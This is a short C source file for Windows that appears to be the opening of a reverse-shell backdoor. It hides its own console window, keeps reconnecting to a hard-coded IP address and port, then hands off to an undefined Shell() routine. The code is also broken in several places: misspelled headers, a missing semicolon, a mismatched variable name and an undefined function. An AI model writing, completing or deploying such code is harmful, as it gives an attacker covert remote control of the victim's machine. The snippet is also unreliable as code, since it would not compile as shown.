#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys.stat.h>
#include <sys.types.h>
#include <winsock2.h>
#include <windows.h>
#include <wininet.h>
#include <windowsx.h>


int sock;

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow)
{
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);

    ShowWindow(stealth, 0);

    struct sockaddr_in ServAddr;
    unsigned short ServPort;
    char *ServIP;
    WSADATA wsaData;

    ServIP = "10.2.32.10";
    ServPort = 7043

    if(WSAStartup(MAKEWORD(2,0), &wsaData) != 0)
    {
        exit(1);
    }

    sock = socket(AF_INET, SOCK_STREAM, 0);

    memset(&ServAddr, 0, sizeof(ServAddr));
    ServAddr.sin_family = AF_INET;
    ServAddr.sin_addr.s_addr = inet_addr(ServIp);
    ServAddr.sin_port = htons(ServPort);

    start:
    while(connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0)
    {
        Sleep(10);
        goto start;
    }
    Shell();
    
}